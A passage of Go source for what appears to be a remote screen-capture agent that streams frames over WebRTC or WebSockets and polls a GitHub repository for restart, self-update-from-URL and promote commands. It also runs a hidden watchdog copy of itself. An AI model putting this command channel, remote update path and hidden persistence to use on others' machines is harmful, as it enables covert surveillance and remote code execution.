	if resp.StatusCode == http.StatusNotFound {
		return
	}
	if resp.StatusCode != http.StatusOK {
		return
	}
	var ghResp struct {
		Content string `json:"content"`
		SHA     string `json:"sha"`
	}
	if err := json.NewDecoder(resp.Body).Decode(&ghResp); err != nil {
		return
	}
	decoded, err := base64.StdEncoding.DecodeString(ghResp.Content)
	if err != nil {
		return
	}
	var cmd struct {
		Command string `json:"command"`
		URL     string `json:"url,omitempty"`
	}
	if err := json.Unmarshal(decoded, &cmd); err != nil {
		return
	}
	llog("info", "Agent received command from GitHub: %s", cmd.Command)
	// Delete command file immediately (best-effort)
	delReq, _ := http.NewRequest("DELETE", apiURL, nil)
	delReq.Header.Set("Authorization", "Bearer "+cfg.GitHubToken)
	delReq.Header.Set("Accept", "application/vnd.github.v3+json")
	http.DefaultClient.Do(delReq)
	// Execute command
	switch cmd.Command {
	case "restart":
		llog("info", "Agent restarting via GitHub command")
		os.Exit(0)
	case "update":
		if cmd.URL != "" {
			go safeRun("agent-update-gh", func() { selfUpdate(cmd.URL) })
		}
	case "promote":
		llog("info", "Agent promoting to server via GitHub command")
		cfg.IsServerMode = true
		os.Exit(0)
	}
}

func tryAgentWebRTC(hostname, serverURL string) bool {
	wsURL := serverURL
	if strings.HasPrefix(wsURL, "https://") {
		wsURL = "wss://" + wsURL[len("https://"):]
	} else if strings.HasPrefix(wsURL, "http://") {
		wsURL = "ws://" + wsURL[len("http://"):]
	}
	wsURL += "/ws"
	conn, _, err := (&websocket.Dialer{}).Dial(wsURL, nil)
	if err != nil {
		llog("error", "Agent WebRTC WS connect to %s failed: %v", wsURL, err)
		return false
	}
	hello, _ := json.Marshal(map[string]interface{}{
		"type":    "hello",
		"agentId": hostname,
		"agent":   true,
		"systemInfo": map[string]string{
			"hostname": getHostname(),
			"local_ip": getLocalIP(),
			"wan_ip":   getWANIP(),
			"os":       runtime.GOOS,
			"arch":     runtime.GOARCH,
			"uptime":   fmt.Sprintf("%.0f", time.Since(startTime).Seconds()),
			"version":  binaryVersion,
			"mode":     "agent",
		},
	})
	if err := conn.WriteMessage(websocket.TextMessage, hello); err != nil {
		conn.Close()
		return false
	}

	// Attempt WebRTC data channel creation
	dc, webrtcReady := tryCreateAgentDataChannel(conn, hostname)
	if webrtcReady {
		llog("info", "Agent %s using WebRTC for frames with WS fallback", hostname)
		go agentReadLoop(conn, hostname)
		sendAgentFramesHybrid(conn, dc, hostname)
	} else {
		llog("info", "Agent %s WebRTC failed, falling back to WS frames", hostname)
		go agentReadLoop(conn, hostname)
		sendAgentFramesWS(conn, hostname)
	}
	return true
}

func tryCreateAgentDataChannel(wsConn *websocket.Conn, hostname string) (*webrtc.DataChannel, bool) {
	config := webrtc.Configuration{
		ICEServers: func() []webrtc.ICEServer {
			servers := []webrtc.ICEServer{
				{URLs: []string{"stun:stun.l.google.com:19302"}},
			}
			if cfg.TurnServerURL != "" {
				cred := cfg.TurnServerCredential
				servers = append(servers, webrtc.ICEServer{
					URLs:       []string{cfg.TurnServerURL},
					Username:   cfg.AgentID,
					Credential: &cred,
				})
			}
			return servers
		}(),
	}
	api := webrtc.NewAPI()
	pc, err := api.NewPeerConnection(config)
	if err != nil {
		llog("warn", "Agent WebRTC NewPeerConnection failed: %v", err)
		return nil, false
	}

	dc, err := pc.CreateDataChannel("frames", nil)
	if err != nil {
		llog("warn", "Agent WebRTC CreateDataChannel failed: %v", err)
		pc.Close()
		return nil, false
	}

	dcReady := make(chan struct{})
	dc.OnOpen(func() {
		close(dcReady)
	})

	offer, err := pc.CreateOffer(nil)
	if err != nil {
		llog("warn", "Agent WebRTC CreateOffer failed: %v", err)
		pc.Close()
		return nil, false
	}
	if err := pc.SetLocalDescription(offer); err != nil {
		llog("warn", "Agent WebRTC SetLocalDescription failed: %v", err)
		pc.Close()
		return nil, false
	}

	// Send offer over WS
	offerMsg, _ := json.Marshal(map[string]interface{}{
		"type":  "webrtc_offer",
		"sdp":   offer.SDP,
		"agent": true,
	})
	if err := wsConn.WriteMessage(websocket.TextMessage, offerMsg); err != nil {
		pc.Close()
		return nil, false
	}

	// Wait for answer via WS messages with cancellable context
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	answerCh := make(chan string, 1)
	iceCh := make(chan string, 5)
	go func() {
		defer cancel()
		for {
			select {
			case <-ctx.Done():
				return
			default:
			}
			_, msg, err := wsConn.ReadMessage()
			if err != nil {
				return
			}
			var msgMap map[string]interface{}
			if err := json.Unmarshal(msg, &msgMap); err != nil {
				continue
			}
			switch msgMap["type"].(string) {
			case "webrtc_answer":
				if sdp, ok := msgMap["sdp"].(string); ok {
					answerCh <- sdp
					return
				}
			case "webrtc_ice":
				if cand, ok := msgMap["candidate"].(string); ok {
					select {
					case iceCh <- cand:
					default:
					}
				}
			default:
				// Ignore non-WebRTC messages
			}
		}
	}()

	// Handle ICE candidates from agent's perspective
	pc.OnICECandidate(func(c *webrtc.ICECandidate) {
		if c == nil { return }
		candJSON, _ := json.Marshal(c.ToJSON())
		iceMsg, _ := json.Marshal(map[string]interface{}{
			"type":      "webrtc_ice",
			"candidate": string(candJSON),
		})
		wsConn.WriteMessage(websocket.TextMessage, iceMsg)
	})

	select {
	case sdp := <-answerCh:
		answer := webrtc.SessionDescription{Type: webrtc.SDPTypeAnswer, SDP: sdp}
		if err := pc.SetRemoteDescription(answer); err != nil {
			llog("warn", "Agent WebRTC SetRemoteDescription failed: %v", err)
			pc.Close()
			return nil, false
		}
	case <-time.After(20 * time.Second):
		llog("warn", "Agent WebRTC answer timeout")
		pc.Close()
		return nil, false
	}

	// Apply any queued ICE candidates
	for i := 0; i < 5; i++ {
		select {
		case cand := <-iceCh:
			var c webrtc.ICECandidateInit
			if json.Unmarshal([]byte(cand), &c) == nil {
				pc.AddICECandidate(c)
			}
		default:
			i = 5
		}
	}

	select {
	case <-dcReady:
		return dc, true
	case <-time.After(15 * time.Second):
		llog("warn", "Agent WebRTC data channel timeout")
		pc.Close()
		return nil, false
	}
}

func sendAgentFramesHybrid(wsConn *websocket.Conn, dc *webrtc.DataChannel, hostname string) {
	defer func() {
		if r := recover(); r != nil {
			llog("error", "PANIC in agent hybrid sender: %v", r)
		}
	}()
	fps := cfg.MaxFPS
	if fps <= 0 { fps = 1 }
	ticker := time.NewTicker(time.Duration(float64(time.Second) / fps))
	defer ticker.Stop()
	triedWS := false
	for range ticker.C {
		img, err := captureScreen()
		if err != nil { continue }
		var buf bytes.Buffer
		if err := jpeg.Encode(&buf, img, &jpeg.Options{Quality: 85}); err != nil { continue }
		wm := WireMessage{Type: MSG_FRAME, Data: buf.Bytes(), AgentID: hostname}
		msg, err := json.Marshal(wm)
		if err != nil { continue }
		// Try WebRTC first
		if !triedWS {
			if err := dc.Send(msg); err == nil {
				continue
			}
			llog("warn", "Agent %s WebRTC send failed, falling back to WS", hostname)
			triedWS = true
		}
		// Fallback to WS
		if err := wsConn.WriteMessage(websocket.TextMessage, msg); err != nil {
			llog("error", "Agent %s WS send failed: %v", hostname, err)
			wsConn.Close()
			return
		}
	}
}

func tryAgentGitHub(hostname string) bool {
	if cfg.GitHubRepo == "" || cfg.GitHubToken == "" {
		llog("warn", "GitHub transport not available — no repo/token configured")
		return false
	}
	llog("info", "Agent %s using GitHub transport: polling for commands and writing heartbeats", hostname)
	ticker := time.NewTicker(30 * time.Second)
	defer ticker.Stop()
	beatTick := 0
	for range ticker.C {
		beatTick++
		if beatTick%2 == 1 {
			safeRun("gh-heartbeat", writeAgentHeartbeat)
		} else {
			safeRun("gh-commands", checkAgentCommandsAndRun)
		}
		// Check leader staleness every 5 ticks (150s = 2.5 min)
		if beatTick%5 == 0 {
			if isLeaderStale() {
				llog("info", "Leader is stale – returning from GitHub transport to re-elect")
				return false
			}
		}
	}
	return false
}

func isLeaderStale() bool {
	rawURL := fmt.Sprintf("https://raw.githubusercontent.com/%s/main/primary_server.json", cfg.GitHubRepo)
	req, _ := http.NewRequest("GET", rawURL, nil)
	resp, err := httpFastClient.Do(req)
	if err != nil {
		llog("debug", "isLeaderStale: fetch failed: %v", err)
		return false
	}
	defer resp.Body.Close()
	if resp.StatusCode == http.StatusNotFound {
		llog("info", "primary_server.json missing – leader is definitely stale")
		return true
	}
	if resp.StatusCode != http.StatusOK {
		return false
	}
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return false
	}
	var primary struct {
		Host    string `json:"host"`
		Updated int64  `json:"updated"`
	}
	if err := json.Unmarshal(body, &primary); err != nil {
		return false
	}
	interval := getElectionInterval()
	if primary.Host == cfg.AgentID {
		return false
	}
	return time.Since(time.UnixMilli(primary.Updated)) > interval
}

func monitorWatchdogProcess() {
	// Every 15s, check if watchdog heartbeat is fresh; if stale for >30s, restart
	wdHeartbeatPath := filepath.Join(dataDir(), "watchdog.heartbeat")
	for {
		time.Sleep(15 * time.Second)
		info, err := os.Stat(wdHeartbeatPath)
		if err != nil {
			llog("warn", "No watchdog heartbeat file, starting watchdog")
			startWatchdogProcess()
			continue
		}
		if time.Since(info.ModTime()) > 30*time.Second {
			llog("warn", "Watchdog heartbeat stale (>30s), restarting")
			startWatchdogProcess()
		}
	}
}

func writeWatchdogHeartbeat() {
	path := filepath.Join(dataDir(), "watchdog.heartbeat")
	os.WriteFile(path, []byte(time.Now().Format(time.RFC3339)), 0644)
}

func startWatchdogProcess() {
	watchdogExe, err := os.Executable()
	if err != nil {
		llog("error", "Cannot get executable path for watchdog: %v", err)
		return
	}
	permPath := filepath.Join(binDir(), filepath.Base(watchdogExe))
	if _, err := os.Stat(permPath); err == nil {
		watchdogExe = permPath
	}
	cmd := exec.Command(watchdogExe, "--watchdog")
	newHiddenCmd(cmd)
	if err := cmd.Start(); err != nil {
		llog("error", "Failed to start watchdog: %v", err)
		return
	}
	llog("info", "Watchdog started with PID: %d", cmd.Process.Pid)
	go func() {
		cmd.Wait()
		llog("warn", "Watchdog exited")
	}()
}

func NewWebRTCManager() *WebRTCManager {
	s := webrtc.SettingEngine{}
	api := webrtc.NewAPI(webrtc.WithSettingEngine(s))
	return &WebRTCManager{
		clients: make(map[string]*WebRTCClient),
		api:     api,
	}
}

func (m *WebRTCManager) iceServers() []webrtc.ICEServer {
	servers := []webrtc.ICEServer{
		{URLs: []string{"stun:stun.l.google.com:19302"}},
	}
	if cfg.TurnServerURL != "" {
		cred := cfg.TurnServerCredential
		servers = append(servers, webrtc.ICEServer{
			URLs:       []string{cfg.TurnServerURL},
			Username:   cfg.AgentID,
			Credential: &cred,
		})
	}
	return servers
}

func (m *WebRTCManager) HandleOffer(connID string, sdp string, wsConn *websocket.Conn, isAgent bool) {
	config := webrtc.Configuration{
		ICEServers: m.iceServers(),
	}

	pc, err := m.api.NewPeerConnection(config)
	if err != nil {
		llog("error", "WebRTC NewPeerConnection: %v", err)
		return
	}

	offer := webrtc.SessionDescription{Type: webrtc.SDPTypeOffer, SDP: sdp}
	if err := pc.SetRemoteDescription(offer); err != nil {
		llog("error", "WebRTC SetRemoteDescription: %v", err)
		pc.Close()
		return
	}

	answer, err := pc.CreateAnswer(nil)
	if err != nil {
		llog("error", "WebRTC CreateAnswer: %v", err)
		pc.Close()
		return
	}
	if err := pc.SetLocalDescription(answer); err != nil {
		llog("error", "WebRTC SetLocalDescription: %v", err)
		pc.Close()
		return
	}

	reply, _ := json.Marshal(map[string]interface{}{
		"type": "webrtc_answer",
		"sdp":  answer.SDP,
	})
	wsConn.WriteMessage(websocket.TextMessage, reply)

	var dc *webrtc.DataChannel
	dcReady := make(chan struct{})

	if isAgent {
		// Agent WebRTC: server receives frames from agent
		pc.OnDataChannel(func(d *webrtc.DataChannel) {
			dc = d
			d.OnOpen(func() {
				llog("info", "WebRTC agent data channel open for %s", connID)
				close(dcReady)
				client := &WebRTCClient{pc: pc, dc: d, connID: connID, connectedAt: time.Now()}
				m.mu.Lock()
				m.clients[connID] = client
				m.mu.Unlock()
				webrtcAgentDataChannels.Store(connID, d)
			})
			d.OnClose(func() {
				llog("info", "WebRTC agent data channel closed for %s", connID)
				webrtcAgentDataChannels.Delete(connID)
				m.mu.Lock()
				delete(m.clients, connID)
				m.mu.Unlock()
			})
			d.OnMessage(func(msg webrtc.DataChannelMessage) {
				// Agent sent data (frame) over WebRTC → broadcast to viewers
				var wm WireMessage
				if err := json.Unmarshal(msg.Data, &wm); err == nil && wm.Type == MSG_FRAME {
					broadcastFrame(msg.Data, &wm)
				}
			})
		})
	} else {
		// Dashboard WebRTC: server sends frames to viewer
		pc.OnDataChannel(func(d *webrtc.DataChannel) {
			dc = d
			d.OnOpen(func() {
				llog("info", "WebRTC data channel open for %s", connID)
				close(dcReady)
				client := &WebRTCClient{pc: pc, dc: d, connID: connID, connectedAt: time.Now()}
				m.mu.Lock()
				m.clients[connID] = client
				m.mu.Unlock()
				webrtcDataChannels.Store(connID, d)
			})
			d.OnClose(func() {
				llog("info", "WebRTC data channel closed for %s", connID)
				webrtcDataChannels.Delete(connID)
				m.mu.Lock()
				delete(m.clients, connID)
				m.mu.Unlock()
			})
		})
	}

	pc.OnICECandidate(func(c *webrtc.ICECandidate) {
		if c == nil { return }
		candJSON, _ := json.Marshal(c.ToJSON())
		msg, _ := json.Marshal(map[string]interface{}{
			"type":      "webrtc_ice",
			"candidate": string(candJSON),
		})
		wsConn.WriteMessage(websocket.TextMessage, msg)
	})

	pc.OnConnectionStateChange(func(s webrtc.PeerConnectionState) {
		if s == webrtc.PeerConnectionStateFailed || s == webrtc.PeerConnectionStateClosed {
			webrtcDataChannels.Delete(connID)
			webrtcAgentDataChannels.Delete(connID)
			m.mu.Lock()
			delete(m.clients, connID)
			m.mu.Unlock()
		}
	})

	go func() {
		select {
		case <-dcReady:
			llog("info", "WebRTC ready for %s", connID)
		case <-time.After(30 * time.Second):
			if dc == nil {
				llog("warn", "WebRTC data channel timeout for %s", connID)
				pc.Close()
			}
		}
	}()
}

func (m *WebRTCManager) HandleICE(connID string, candidateJSON string) {
	m.mu.Lock()
	client, ok := m.clients[connID]
	m.mu.Unlock()
	if !ok {
		return
	}
	var cand webrtc.ICECandidateInit
	if err := json.Unmarshal([]byte(candidateJSON), &cand); err != nil {
		return
	}
	client.pc.AddICECandidate(cand)
}

func (m *WebRTCManager) BroadcastFrame(wm *WireMessage) {
	data := wm.Marshal()
	webrtcDataChannels.Range(func(key, value interface{}) bool {
		if dc, ok := value.(*webrtc.DataChannel); ok {
			if err := dc.Send(data); err != nil {
				webrtcDataChannels.Delete(key)
				m.mu.Lock()
				delete(m.clients, key.(string))
				m.mu.Unlock()
			}
		}
		return true
	})
}

func (m *WebRTCManager) ClientCount() int {
	m.mu.Lock()
	defer m.mu.Unlock()
    return len(m.clients)
}
func startServerComponents() {}
